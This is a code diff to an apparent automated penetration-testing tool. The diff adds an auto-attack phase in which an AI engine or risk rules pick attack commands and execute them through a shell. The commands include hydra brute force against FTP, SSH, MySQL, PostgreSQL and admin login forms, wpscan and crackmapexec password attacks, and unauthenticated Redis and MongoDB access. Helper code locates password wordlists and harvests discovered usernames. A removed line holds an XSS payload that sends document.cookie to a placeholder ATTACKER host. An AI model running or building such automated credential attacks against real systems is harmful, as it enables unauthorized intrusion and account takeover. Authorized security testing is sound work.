@@ -68,6 +68,153 @@ def _url(target):
         return f"http://{target}"
     return target
 
+
+def _find_wordlist(kind="users"):
+    """Find an available wordlist file on the system."""
+    candidates = {
+        "users": [
+            "/usr/share/wordlists/dirb/others/names.txt",
+            "/usr/share/seclists/Usernames/top-usernames-shortlist.txt",
+            "/usr/share/wordlists/metasploit/unix_users.txt",
+        ],
+        "passwords": [
+            "/usr/share/wordlists/rockyou.txt",
+            "/usr/share/wordlists/dirb/others/best15.txt",
+            "/usr/share/seclists/Passwords/Common-Credentials/best15.txt",
+        ],
+        "passwords_small": [
+            "/usr/share/wordlists/dirb/others/best15.txt",
+            "/usr/share/seclists/Passwords/Common-Credentials/best15.txt",
+            "/usr/share/wordlists/metasploit/unix_passwords.txt",
+        ],
+    }
+    for p in candidates.get(kind, candidates["users"]):
+        if os.path.isfile(p):
+            return p
+    return None
+
+
+def _extract_discovered_users(findings):
+    """Extract usernames discovered during scanning phases."""
+    users = []
+    for f in findings:
+        title = f.get("title", "")
+        for prefix in ("Username: ", "WP User: ", "SMB User: ", "Valid username: "):
+            if title.startswith(prefix):
+                u = title[len(prefix):].strip()
+                if u and u not in users:
+                    users.append(u)
+    for default in ("admin", "root", "administrator"):
+        if default not in users:
+            users.append(default)
+    return users
+
+
+def _prepare_attack(cmd, findings):
+    """Validate and fix an attack command before auto-execution.
+    Returns (fixed_cmd, skip_reason). If skip_reason is set, skip this attack."""
+    if not cmd or not cmd.strip():
+        return None, "Empty command"
+    cmd = cmd.strip()
+
+    # Skip HTML/JS snippets
+    if cmd.startswith(("<iframe", "<script", "<img")):
+        return None, "Client-side payload (not auto-executable)"
+
+    # Skip plain-text descriptions (not real shell commands)
+    first_word = cmd.split()[0] if cmd.split() else ""
+    non_executable = ["Use", "Browse", "Check", "Try", "Test", "Configure",
+                      "With", "In", "Run", "Go"]
+    if first_word in non_executable:
+        return None, "Manual/descriptive action"
+
+    # Resolve binary name (handle 'timeout N cmd', 'cd dir && cmd')
+    binary = first_word
+    if binary == "timeout":
+        parts = cmd.split()
+        binary = parts[2] if len(parts) > 2 else ""
+    if binary == "cd":
+        parts = cmd.split("&&")
+        if len(parts) > 1:
+            binary = parts[1].strip().split()[0]
+
+    # Check if primary binary exists
+    builtins = {"echo", "cat", "grep", "head", "tail", "curl", "wget",
+                "timeout", "cd", "bash", "sh"}
+    if binary and not binary.startswith("/") and binary not in builtins:
+        if not shutil.which(binary):
+            return None, f"Tool not installed: {binary}"
+
+    # Fix bare wordlist references
+    if " users.txt" in cmd and "/usr/share" not in cmd and "/tmp/" not in cmd:
+        wl = _find_wordlist("users")
+        if wl:
+            cmd = cmd.replace(" users.txt", f" {wl}")
+        else:
+            return None, "No user wordlist available"
+    if " pass.txt" in cmd and "/usr/share" not in cmd and "/tmp/" not in cmd:
+        wl = _find_wordlist("passwords_small")
+        if wl:
+            cmd = cmd.replace(" pass.txt", f" {wl}")
+        else:
+            return None, "No password wordlist available"
+
+    # Write discovered usernames to temp files if referenced
+    if "/tmp/users.txt" in cmd or "/tmp/ht_users.txt" in cmd:
+        users = _extract_discovered_users(findings)
+        if users:
+            with open("/tmp/ht_users.txt", "w") as f:
+                f.write("\n".join(users) + "\n")
+            cmd = cmd.replace("/tmp/users.txt", "/tmp/ht_users.txt")
+        else:
+            return None, "No usernames discovered for brute force"
+    if "/tmp/smb_users.txt" in cmd or "/tmp/ht_smb_users.txt" in cmd:
+        smb_users = [f_["title"].replace("SMB User: ", "")
+                     for f_ in findings if f_.get("title", "").startswith("SMB User:")]
+        if smb_users:
+            with open("/tmp/ht_smb_users.txt", "w") as f:
+                f.write("\n".join(smb_users) + "\n")
+            cmd = cmd.replace("/tmp/smb_users.txt", "/tmp/ht_smb_users.txt")
+        else:
+            return None, "No SMB usernames discovered"
+
+    # Add timeout wrapper for brute force commands
+    if "hydra " in cmd and "timeout " not in cmd:
+        cmd = f"timeout 90 {cmd}"
+    if "wpscan " in cmd and "--password-attack" in cmd and "timeout " not in cmd:
+        cmd = f"timeout 180 {cmd}"
+    if "crackmapexec " in cmd and "timeout " not in cmd:
+        cmd = f"timeout 90 {cmd}"
+
+    return cmd, None
+
+
+def _run_live(cmd, scan, timeout=120):
+    """Run a command with live output streaming to scan['current_attack']['output']."""
+    try:
+        proc = subprocess.Popen(
+            cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+            text=True, bufsize=1)
+        output = ""
+        start = time.time()
+        for line in proc.stdout:
+            output += line
+            if scan and scan.get("current_attack"):
+                scan["current_attack"]["output"] = output[-5000:]
+            if time.time() - start > timeout:
+                proc.kill()
+                output += f"\n[Timed out after {timeout}s]\n"
+                break
+        try:
+            proc.wait(timeout=5)
+        except subprocess.TimeoutExpired:
+            proc.kill()
+        rc = proc.returncode if proc.returncode is not None else -1
+        return output, "", rc
+    except Exception as e:
+        return "", str(e), -1
+
+
 def detect_type(target):
     target = target.strip()
     if re.match(r'^[\w.+-]+@[\w.-]+\.\w+$', target):
@@ -164,15 +311,27 @@ def mod_headers(target, tt):
                 F.append(_finding(sev, f"Missing {hdr}", detail, module="Headers"))
 
         if "X-Frame-Options" not in h and "Content-Security-Policy" not in h:
-            A.append(_attack("Clickjacking", "No frame protection", f'<iframe src="{url}" width="100%" height="100%"></iframe>', "medium", "client_side"))
+            A.append(_attack("Clickjacking test", "No frame protection",
+                f"curl -sI {url} 2>&1 | grep -iE 'x-frame|content-security|server'",
+                "medium", "client_side",
+                context="No X-Frame-Options or CSP frame-ancestors header. Page can be embedded in an iframe for clickjacking attacks.",
+                look_for="If neither X-Frame-Options nor Content-Security-Policy appears, the page is clickjackable."))
         if "Strict-Transport-Security" not in h:
-            A.append(_attack("SSL Stripping", "No HSTS", "sslstrip / bettercap MITM", "medium", "network"))
+            A.append(_attack("HSTS bypass test", "No HSTS header",
+                f"curl -sIL http://{_domain(target)} 2>&1 | head -30",
+                "medium", "network",
+                context="No HSTS header — browsers don't enforce HTTPS. Testing HTTP redirect behavior to check if downgrade attacks are possible.",
+                look_for="If HTTP doesn't redirect to HTTPS (or redirects without HSTS), SSL stripping is possible on the same network."))
 
         sc = h.get("Set-Cookie","")
         if sc:
             if "httponly" not in sc.lower():
                 F.append(_finding("medium", "Cookie missing HttpOnly", "JS can read session cookies", module="Headers"))
-                A.append(_attack("Cookie theft via XSS", "HttpOnly missing", "<script>fetch('http://ATTACKER/'+document.cookie)</script>", "high", "client_side"))
+                A.append(_attack("Cookie flag audit", "HttpOnly missing",
+                    f"curl -sI {url} 2>&1 | grep -i set-cookie",
+                    "high", "client_side",
+                    context="Session cookies lack HttpOnly flag — JavaScript can read them via document.cookie. Any XSS can steal sessions.",
+                    look_for="Check Set-Cookie headers for HttpOnly and Secure flags. Missing HttpOnly = JS accessible. Missing Secure = sent over HTTP."))
             if "secure" not in sc.lower():
                 F.append(_finding("medium", "Cookie missing Secure flag", "Sent over HTTP", module="Headers"))
 
@@ -183,7 +342,9 @@ def mod_headers(target, tt):
             if any(p in body for p in pats):
                 F.append(_finding("info", f"CMS: {name}", f"Detected in response", module="Headers"))
                 if name == "WordPress":
-                    A.append(_attack(f"WPScan", "Enumerate WordPress vulns", f"wpscan --url {url}", "medium", "exploitation"))
+                    A.append(_attack(f"WPScan", "Enumerate WordPress vulns",
+                        f"wpscan --url {url} --enumerate u,vp,vt --no-banner --random-user-agent --disable-tls-checks 2>&1 | head -200",
+                        "medium", "exploitation"))
                 break
 
     except requests.exceptions.SSLError:
@@ -325,39 +486,55 @@ def mod_nmap(target, tt):
         ver = ver.strip()
         F.append(_finding("info", f"Port {port}/{svc}", ver or svc, evidence=f"{port}/tcp open {svc} {ver}", module="NMAP"))
 
+        _uwl = _find_wordlist("users") or "/usr/share/wordlists/dirb/others/names.txt"
+        _pwl = _find_wordlist("passwords_small") or "/usr/share/wordlists/dirb/others/best15.txt"
         if port == 21 or svc == "ftp":
             F.append(_finding("medium", "FTP exposed", "", module="NMAP"))
-            A.append(_attack("FTP anonymous login", "Check anonymous access", f"ftp {host} # try anonymous/anonymous", "medium", "access"))
-            A.append(_attack("FTP brute force", "", f"hydra -L users.txt -P pass.txt ftp://{host}", "medium", "brute_force"))
+            A.append(_attack("FTP anonymous login", "Check anonymous access",
+                f"nmap --script ftp-anon -p 21 {host}", "medium", "access"))
+            A.append(_attack("FTP brute force", "Test credentials against FTP",
+                f"hydra -L {_uwl} -P {_pwl} ftp://{host} -t 4 -f", "medium", "brute_force"))
         if port == 22 or svc == "ssh":
-            A.append(_attack("SSH brute force", "", f"hydra -L users.txt -P pass.txt ssh://{host}", "medium", "brute_force"))
+            A.append(_attack("SSH brute force", "Test credentials against SSH",
+                f"hydra -L {_uwl} -P {_pwl} ssh://{host} -t 4 -f", "medium", "brute_force"))
             m = re.search(r'OpenSSH[_ ](\d+\.\d+)', ver)
             if m and float(m.group(1)) < 8.0:
                 F.append(_finding("high", f"Outdated OpenSSH {m.group(1)}", "", module="NMAP"))
-                A.append(_attack("Exploit old SSH", "", f"searchsploit openssh {m.group(1)}", "high", "exploitation"))
+                A.append(_attack("Exploit old SSH", f"OpenSSH {m.group(1)}",
+                    f"searchsploit openssh {m.group(1)}", "high", "exploitation"))
         if port == 23:
             F.append(_finding("high", "Telnet exposed", "Plaintext protocol", module="NMAP"))
+            A.append(_attack("Telnet banner grab", "Check Telnet service",
+                f"nmap --script telnet-ntlm-info -p 23 {host}", "medium", "recon"))
         if port in (80,443,8080,8443) or "http" in svc:
-            A.append(_attack(f"Web scan port {port}", "", f"nikto -h {host}:{port}", "medium", "recon"))
+            A.append(_attack(f"Web scan port {port}", "Nikto vulnerability scan",
+                f"nikto -h {host}:{port} -maxtime 120 -nointeractive", "medium", "recon"))
         if port == 3306 or svc == "mysql":
             F.append(_finding("high", "MySQL exposed", "", module="NMAP"))
-            A.append(_attack("MySQL brute force", "", f"hydra -L users.txt -P pass.txt mysql://{host}", "high", "brute_force"))
+            A.append(_attack("MySQL brute force", "Test credentials against MySQL",
+                f"hydra -L {_uwl} -P {_pwl} mysql://{host} -t 4 -f", "high", "brute_force"))
         if port == 5432 or svc == "postgresql":
             F.append(_finding("high", "PostgreSQL exposed", "", module="NMAP"))
-            A.append(_attack("PostgreSQL brute force", "", f"hydra -L users.txt -P pass.txt postgres://{host}", "high", "brute_force"))
+            A.append(_attack("PostgreSQL brute force", "Test credentials against PostgreSQL",
+                f"hydra -L {_uwl} -P {_pwl} postgres://{host} -t 4 -f", "high", "brute_force"))
         if port == 3389:
             F.append(_finding("medium", "RDP exposed", "", module="NMAP"))
-            A.append(_attack("BlueKeep check", "CVE-2019-0708", f"nmap --script rdp-vuln-ms12-020 -p 3389 {host}", "critical", "exploitation"))
+            A.append(_attack("BlueKeep check", "CVE-2019-0708",
+                f"nmap --script rdp-vuln-ms12-020 -p 3389 {host}", "critical", "exploitation"))
         if port == 445 or svc == "microsoft-ds":
             F.append(_finding("high", "SMB exposed", "", module="NMAP"))
-            A.append(_attack("EternalBlue check", "MS17-010", f"nmap --script smb-vuln-ms17-010 -p 445 {host}", "critical", "exploitation"))
-            A.append(_attack("SMB enum shares", "", f"smbclient -L //{host}/ -N", "medium", "recon"))
+            A.append(_attack("EternalBlue check", "MS17-010",
+                f"nmap --script smb-vuln-ms17-010 -p 445 {host}", "critical", "exploitation"))
+            A.append(_attack("SMB enum shares", "List network shares",
+                f"smbclient -L //{host}/ -N 2>&1 | head -30", "medium", "recon"))
         if port == 6379:
             F.append(_finding("critical", "Redis exposed", "Often no auth", module="NMAP"))
-            A.append(_attack("Redis unauth access", "", f"redis-cli -h {host}", "critical", "access"))
+            A.append(_attack("Redis unauth access", "Test unauthenticated access",
+                f"redis-cli -h {host} --no-auth-warning INFO 2>&1 | head -30", "critical", "access"))
         if port == 27017:
             F.append(_finding("critical", "MongoDB exposed", "Often no auth", module="NMAP"))
-            A.append(_attack("MongoDB unauth access", "", f"mongosh --host {host}", "critical", "access"))
+            A.append(_attack("MongoDB unauth access", "Test unauthenticated access",
+                f"mongosh --host {host} --eval 'db.adminCommand({{listDatabases:1}})' --quiet 2>&1 | head -30", "critical", "access"))
 
     for cve in set(re.findall(r'(CVE-\d{4}-\d+)', s)):
         F.append(_finding("critical", f"CVE: {cve}", "Detected by NMAP scripts", module="NMAP"))
@@ -400,7 +577,13 @@ def mod_dirb(target, tt):
             F.append(_finding("info", f"Dir: {path}", f"{found_url}", module="Dirb"))
             if any(p in path.lower() for p in ["/admin","/manager","/phpmyadmin","/wp-admin","/cpanel","/dashboard"]):
                 F.append(_finding("high", f"Admin panel: {path}", "", module="Dirb"))
-                A.append(_attack("Admin brute force", f"Panel at {path}", f"hydra -L users.txt -P pass.txt {_domain(target)} http-post-form '{path}:user=^USER^&pass=^PASS^:invalid'", "high", "brute_force"))
+                _uwl = _find_wordlist("users") or "/usr/share/wordlists/dirb/others/names.txt"
+                _pwl = _find_wordlist("passwords_small") or "/usr/share/wordlists/dirb/others/best15.txt"
+                A.append(_attack("Admin brute force", f"Panel at {path}",
+                    f"hydra -L {_uwl} -P {_pwl} {_domain(target)} http-post-form '{path}:username=^USER^&password=^PASS^:invalid' -t 4 -f",
+                    "high", "brute_force",
+                    context=f"Dirb discovered an admin panel at {path}. Hydra tests common credentials against the login form.",
+                    look_for="Look for '[80][http-post-form]' lines with 'login:' and 'password:' — confirmed credentials for the admin panel."))
             if any(p in path.lower() for p in ["/backup","/.git","/.env","/config","/.svn"]):
                 F.append(_finding("critical", f"Sensitive path: {path}", "", module="Dirb"))
                 A.append(_attack(f"Access {path}", "Sensitive data", f"curl -s {found_url}", "critical", "info_disclosure"))
@@ -1151,6 +1334,7 @@ def start_scan(target, target_type=None):
         "msf_results": [],
         "ai_assessment": None,
         "report_html": None,
+        "current_attack": None,
         "summary": {"critical":0,"high":0,"medium":0,"low":0,"info":0},
         "progress": {
             "total": len(applicable) + extra_phases,
@@ -1262,7 +1446,7 @@ def _execute(scan_id, target, target_type, modules):
     # ── Phase 5: Auto-Attack Execution ───────────────────────────────────
     scan["phase"] = "auto_attack"
     scan["progress"]["phase"] = "auto_attack"
-    scan["progress"]["current"] = "Selecting attacks to auto-execute..."
+    scan["progress"]["current"] = "Preparing attacks..."
 
     # Use AI (or rules) to pick which attacks to run
     if ai_engine:
@@ -1274,17 +1458,27 @@ def _execute(scan_id, target, target_type, modules):
         selected_indices = [
             i for i, a in enumerate(scan["attacks"])
             if a["risk"] in ("critical", "high")
-        ][:15]
+        ][:20]
 
-    attacks_to_run = [
-        (i, scan["attacks"][i]) for i in selected_indices
-        if i < len(scan["attacks"])
-    ]
+    # Validate and prepare each selected attack command
+    attacks_to_run = []
+    skipped_attacks = []
+    for i in selected_indices:
+        if i >= len(scan["attacks"]):
+            continue
+        attack = scan["attacks"][i]
+        fixed_cmd, skip_reason = _prepare_attack(attack["command"], scan["findings"])
+        if skip_reason:
+            skipped_attacks.append({"name": attack["name"], "reason": skip_reason})
+        else:
+            attacks_to_run.append((i, attack, fixed_cmd))
+
     scan["progress"]["auto_attacks_total"] = len(attacks_to_run)
     scan["progress"]["auto_attacks_done"] = 0
+    scan["progress"]["auto_attacks_skipped"] = len(skipped_attacks)
 
     scan["modules"]["auto_attack"] = {
-        "name": f"Auto-Attack ({len(attacks_to_run)} selected)",
+        "name": f"Auto-Attack ({len(attacks_to_run)} executable, {len(skipped_attacks)} skipped)",
         "phase": "auto_attack",
         "status": "running",
         "raw_output": "",
@@ -1292,26 +1486,41 @@ def _execute(scan_id, target, target_type, modules):
     }
 
     attack_results = []
-    for idx, (orig_idx, attack) in enumerate(attacks_to_run):
+    for idx, (orig_idx, attack, prepared_cmd) in enumerate(attacks_to_run):
+        # Set live tracking for the current attack
+        scan["current_attack"] = {
+            "name": attack["name"],
+            "command": prepared_cmd,
+            "risk": attack["risk"],
+            "category": attack.get("category", ""),
+            "status": "running",
+            "output": "",
+            "index": idx,
+            "total": len(attacks_to_run),
+        }
         scan["progress"]["current"] = f"Attacking: {attack['name']} ({idx+1}/{len(attacks_to_run)})"
 
-        # Execute the attack command
-        cmd = attack["command"]
-        stdout, stderr, exit_code = _run(cmd, timeout=120)
-        output = stdout + stderr
+        # Execute with live output streaming
+        output, stderr, exit_code = _run_live(prepared_cmd, scan, timeout=120)
+        if stderr:
+            output += stderr
+
+        # Update current attack status
+        scan["current_attack"]["status"] = "analyzing"
+        scan["current_attack"]["output"] = output[-5000:]
 
         # Analyze result
         if ai_engine:
             analysis = ai_engine.analyze_attack_result(
-                attack["name"], cmd, output, exit_code
+                attack["name"], prepared_cmd, output, exit_code
             )
         else:
-            analysis = _basic_analyze_result(attack["name"], cmd, output, exit_code)
+            analysis = _basic_analyze_result(attack["name"], prepared_cmd, output, exit_code)
 
         result = {
             "attack_name": attack["name"],
             "attack_index": orig_idx,
-            "command": cmd,
+            "command": prepared_cmd,
             "output": output[:5000],
             "exit_code": exit_code,
             "risk": attack["risk"],
@@ -1319,6 +1528,7 @@ def _execute(scan_id, target, target_type, modules):
             "analysis": analysis,
         }
         attack_results.append(result)
+        scan["attack_results"] = list(attack_results)  # live update for UI polling
 
         # If we found new credentials or confirmed vulns, add to findings
         if analysis.get("credentials"):
@@ -1348,9 +1558,19 @@ def _execute(scan_id, target, target_type, modules):
 
         scan["progress"]["auto_attacks_done"] = idx + 1
 
+    # Clear live attack tracker
+    scan["current_attack"] = None
+
+    # Add skip info to raw output
+    skip_info = ""
+    if skipped_attacks:
+        skip_info = "=== Skipped Attacks ===\n" + "\n".join(
+            f"  {s['name']}: {s['reason']}" for s in skipped_attacks
+        ) + "\n\n"
+
     scan["attack_results"] = attack_results
     scan["modules"]["auto_attack"]["status"] = "completed"
-    scan["modules"]["auto_attack"]["raw_output"] = "\n".join(
+    scan["modules"]["auto_attack"]["raw_output"] = skip_info + "\n".join(
         f"=== {r['attack_name']} (exit:{r['exit_code']}) ===\n"
         f"$ {r['command']}\n{r['output'][:1000]}\n"
         f"Analysis: {r['analysis'].get('summary','')}\n"
